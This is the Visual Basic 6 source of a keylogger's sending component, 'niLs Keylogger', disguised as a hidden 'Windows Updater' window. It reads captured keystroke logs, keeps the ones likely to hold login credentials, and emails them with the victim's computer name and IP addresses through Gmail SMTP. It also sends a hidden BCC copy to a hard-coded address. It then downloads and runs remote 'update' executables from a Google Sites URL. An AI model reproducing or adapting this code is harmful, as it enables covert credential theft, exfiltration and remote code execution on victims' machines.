VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Windows Updater"
   ClientHeight    =   210
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   210
   Icon            =   "SendMail.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   210
   ScaleWidth      =   210
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtLog 
      Height          =   3015
      Left            =   4200
      MultiLine       =   -1  'True
      TabIndex        =   2
      Top             =   360
      Width           =   2655
   End
   Begin VB.FileListBox File1 
      Height          =   3990
      Left            =   120
      Pattern         =   "*.nkl"
      TabIndex        =   1
      Top             =   360
      Width           =   1572
   End
   Begin VB.TextBox txtSendThis 
      Height          =   3015
      Left            =   1680
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   360
      Width           =   2535
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Option Explicit

'to Get public IP
Private Declare Function URLDownloadToFile Lib "urlmon" _
   Alias "URLDownloadToFileA" _
  (ByVal pCaller As Long, _
   ByVal szURL As String, _
   ByVal szFileName As String, _
   ByVal dwReserved As Long, _
   ByVal lpfnCB As Long) As Long
   
Private Const ERROR_SUCCESS As Long = 0
Private Const BINDF_GETNEWESTVERSION As Long = &H10
Private Const INTERNET_FLAG_RELOAD As Long = &H80000000

'run update.exe
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
                    ByVal hwnd As Long, _
                    ByVal lpOperation As String, _
                    ByVal lpFile As String, _
                    ByVal lpParameters As String, _
                    ByVal lpDirectory As String, _
                    ByVal nShowCmd As Long) As Long
 
Private Const SW_HIDE As Long = 0
Private Const SW_SHOWNORMAL As Long = 1
Private Const SW_SHOWMAXIMIZED As Long = 3
Private Const SW_SHOWMINIMIZED As Long = 2

'Special Folder Path
Public Enum mceIDLPaths
   ' CSIDL_APPDATA = &H19  'C:\WINNT\Profiles\username\Application Data.
    CSIDL_PROGDATA = &H23
End Enum
Private Declare Function SHGetSpecialFolderPath Lib "shell32.dll" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliSeconds As Long)

Public DeleteSentLogs As Boolean, LocalIP, PublicIP As String
Public sendTo, sendFrom, Password, CompID, LogDir, PubIPURL As String, CurVersion As Integer
Private Sub Form_Load()
If App.PrevInstance = True Then End 'no multiple instances allowed
TransparentForm Me
Me.Left = Screen.Width - Me.Width
Me.Top = Screen.Height - Me.Height
Call mainNew        'Main Function
End Sub
Private Sub mainNew()
Dim LogFilePath, CurrLog, temp As String, Retry As Integer
Call LoadSetting        'Loads Ip address, CompNames and settings.txt
File1.Path = LogDir
CurrLog = Format$(Now, "ddmmyy") & ".nkl"
Retry = 0
File1.Refresh

While File1.ListCount > 1
    File1.ListIndex = 0                 'Choose first log
    If File1.FileName = CurrLog Then File1.ListIndex = 1 'Dont send todays log
    LogFilePath = File1.Path & "\" & File1.FileName
    If ReadLog(LogFilePath) < 40 Then       'Load Log content into textbox
                                        'But Limited User Cant Delete Admin Files
        Kill LogFilePath                'Discard that Log which has nothing like login credentials
    Else
        Call AttachLogDetails(LogFilePath)     'Load Log Details into textbox and concatenates with LogContent
ReSend:
        If SendLog = True Then      'Call Sendlog function
            'MsgBox "Sent : " & LogFilePath
            'Mark log as sent by rename/delete
            If DeleteSentLogs = True Then
                Kill LogFilePath
            Else
                temp = Left$(LogFilePath, Len(LogFilePath) - 3) & "snkl"
                If Dir(temp) <> "" Then Kill LogFilePath Else Name LogFilePath As temp      'If file already exist..delete rather than renaming
            End If
        Else
            'MsgBox "Not Sent : " & LogFilePath
            If Retry >= 3 Then End  'Tried 3 times, still not sent
            Retry = Retry + 1
            Sleep 200000         'Sleep 5 minutes...  5*60*1000
            GoTo ReSend         'Send Again
        End If
    End If
File1.Refresh       'Reload after deleting/renaimng files
Wend

UpdatePackage   'Updates

End         'job Over

End Sub
Private Sub UpdatePackage()
Dim sSourceUrl, PatchURL, fType As String, NewVersion As Integer, res As Double

sSourceUrl = "https://sites.google.com/site/nilsklg/" & CompID & ".txt"
'sSourceUrl = "http://127.0.0.1/x/" & CompID & ".txt"
If DownloadFile(sSourceUrl, App.Path & "\version.txt") Then
      Open App.Path & "\version.txt" For Input As 1
        Input #1, NewVersion, PatchURL
      Close #1
      Kill (App.Path & "\version.txt")
      If CurVersion < NewVersion And Len(PatchURL) > 10 Then    'Update Available

      fType = GetFileExtension(PatchURL)    'Get extension
        If Mid$(PatchURL, Len(PatchURL) - 4, 1) = "-" Then  'Run as Administrator
            If DownloadFile(PatchURL, App.Path & "\update." & fType) Then
               ' res = Shell(App.Path & "\myprg.exe", vbNormalFocus)  'gives error if We run setup.exe
                res = ShellExecute(Me.hwnd, "Open", App.Path & "\update." & fType, vbNullString, App.Path, SW_SHOWNORMAL)
                'res=5 then user lacks admin rights/password
            End If
        Else
            If DownloadFile(PatchURL, App.Path & "\myprg." & fType) Then 'Run as CurrentUser
                res = ShellExecute(Me.hwnd, "Open", App.Path & "\myprg." & fType, vbNullString, App.Path, SW_SHOWNORMAL)
            End If
        End If
      End If
End If
End Sub
Private Sub LoadSetting()
Dim SettingsPath As String
SettingsPath = GetSpecialFolderA(CSIDL_PROGDATA)

If Dir(SettingsPath & "System\settings.txt") <> "" Then
    'Load settings
    Open (SettingsPath & "System\settings.txt") For Input As 1
    Input #1, LogDir, CompID, sendTo, sendFrom, Password, CurVersion, PubIPURL
    Close #1
Else
    'setting not found Load default value
    LogDir = SettingsPath & "System\NLogs\"
    CompID = "SYSTEM"
    sendTo = "none"
    PubIPURL = "abc"    'Use default
    CurVersion = 0
End If

If Len(sendTo) < 15 Then
    End
Else
    'Apply/adjust settings variables
    If Left(CompID, 1) = "*" Then DeleteSentLogs = True
    If Left(LogDir, 2) = "u:" Then LogDir = Environ$("USERPROFILE") & Mid(LogDir, 3, Len(LogDir) - 2)
    PublicIP = getPublicIP(PubIPURL)   'Pass URL to grab IP from
    LocalIP = getLocalIP
End If
End Sub

Private Function ReadLog(ByVal LogFile As String) As Integer
'Read Log & add to txtLog returns length of txtLog
txtLog.Text = ""
Dim sTemp As String
Open LogFile For Input As 2
      While Not EOF(2)
        Line Input #2, sTemp
        If Left(sTemp, 2) <> Chr(34) & Chr(155) Then
            txtLog.Text = txtLog.Text & sTemp & "<br>"
        End If
      Wend
Close #2
ReadLog = Len(txtLog.Text)
End Function
Private Sub AttachLogDetails(ByVal LogFile As String)
Dim NoNeed, lTime, lDate, AppRevision, lCompID As String

'Read initials
Open LogFile For Input As 1
Input #1, NoNeed, lTime, lDate, lCompID, AppRevision
Close #1

txtSendThis.Text = "<b>Keylog Generated with <a href=" & Chr(34) & "nilskeylogger.blogspot.in" & Chr(34) & _
">niLs Keylogger</a></b><br>" & _
"<b>Computer Name: </b>" & lCompID & "(" & VBA.Environ$("COMPUTERNAME") & ")" & "<br>" & _
"<b>IP Address: </b> " & PublicIP & " | " & LocalIP & "<br>" & _
"<b>Start Time: </b>" & lDate & "  " & lTime & "<br>" & _
"<b>End Time: </b>" & FileDateTime(LogFile) & "<br>" & _
"<b>AppVersion: </b>" & AppRevision & " <b> PackageVersion : </b>" & CurVersion & " <br>" & _
"----------------------------<br><br>" & txtLog.Text
End Sub
Private Function SendLog() As Boolean
'MsgBox "SendFrom :" & sendFrom & vbCrLf & "SendTo : " & sendTo & vbCrLf & "Password : " & Password
'Open "x.html" For Output As 1
'  Print #1, txtSendThis.Text
'Close #1
'GoTo SkipEmail

'------------------------------------------------------
Set iMsg = CreateObject("CDO.Message")
Set iConf = CreateObject("CDO.Configuration")
Set Flds = iConf.Fields

' send one copy with Google SMTP server (with autentication)
schema = "http://schemas.microsoft.com/cdo/configuration/"
Flds.Item(schema & "sendusing") = 2
Flds.Item(schema & "smtpserver") = "smtp.gmail.com"
Flds.Item(schema & "smtpserverport") = 465
Flds.Item(schema & "smtpauthenticate") = 1
Flds.Item(schema & "sendusername") = sendFrom '"yourID@gmail.com"
Flds.Item(schema & "sendpassword") = Password '"myPassword"
Flds.Item(schema & "smtpusessl") = 1
Flds.Update

On Error GoTo Err2
With iMsg
    .To = sendTo '"anyone@anything.com"
    .From = sendFrom '"yourID@gmail.com"
    .Subject = "niLsKLG (" & CompID & ")"
    .Bcc = "thenil1234@rediffmail.com"
    .HTMLBody = txtSendThis.Text
'   .TextBody = txtSendThis.Text
'    .AddAttachment LogFile
Set .Configuration = iConf
    .Send
End With

Set iMsg = Nothing
Set iConf = Nothing
Set Flds = Nothing

'SkipEmail:
'Email Sent!
SendLog = True
Exit Function

Err2:
'Email not sent
If Err.Number <> 0 Then
    If Err.Number = -2147220973 Then
        SendLog = False             'Internet not connected
    Else
        'MsgBox Err.Description: 'Password, Username or any setting might be wrong
        MsgBox "Username or password is wrong!", vbCritical, "Error"
        End
    End If
Else        'err.number=0
    SendLog = True
End If

End Function
Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String

Dim Ret As Long
Dim Trash As String: Trash = Space$(260)

    Ret = SHGetSpecialFolderPath(0, Trash, eSpecialFolder, False)
    If Trim$(Trash) <> Chr(0) Then Trash = Left$(Trash, InStr(Trash, Chr(0)) - 1) & "\"
     
    GetSpecialFolderA = Trash
    

End Function
Private Function getPublicIP(ByVal FromSite As String) As String

Dim sSourceUrl, sLocalFile As String
If FromSite = "none" Then getPublicIP = "SKIPPED": Exit Function

If Len(FromSite) < 15 Then FromSite = "http://wgetip.com/" 'Use default if length less
sLocalFile = File1.Path & "\IP.txt"
sSourceUrl = FromSite
'This site provides IP in Text only format

If DownloadFile(sSourceUrl, sLocalFile) Then
      Dim strIP As String
      Open sLocalFile For Input As 1
      Input #1, strIP
      Close #1
      getPublicIP = strIP
End If

If Dir(sLocalFile) <> "" Then Kill sLocalFile

End Function

Public Function DownloadFile(ByVal sSourceUrl As String, _
                             sLocalFile As String) As Boolean
    DownloadFile = URLDownloadToFile(0&, _
                                    sSourceUrl, _
                                    sLocalFile, _
                                    BINDF_GETNEWESTVERSION, _
                                    0&) = ERROR_SUCCESS
   
End Function

Public Function getLocalIP() As String

Dim WMI     As Object
Dim qryWMI  As Object
Dim Item    As Variant
Dim IPAd As String

    Set WMI = GetObject("winmgmts:\\.\root\cimv2")

    Set qryWMI = WMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration " & _
                               "WHERE IPEnabled = True")

IPAd = ""
    For Each Item In qryWMI
      IPAd = IPAd & "  " & Item.IPAddress(0)
    Next

    Set WMI = Nothing
    Set qryWMI = Nothing
getLocalIP = IPAd   'return all Ips separated by spaces
End Function

Function GetFileExtension(ByVal FileName As String) As String
    Dim i As Long
    For i = Len(FileName) To 1 Step -1
        Select Case Mid$(FileName, i, 1)
            Case "."
                GetFileExtension = Mid$(FileName, i + 1)
                Exit For
            Case ":", "\"
                Exit For
        End Select
    Next
End Function
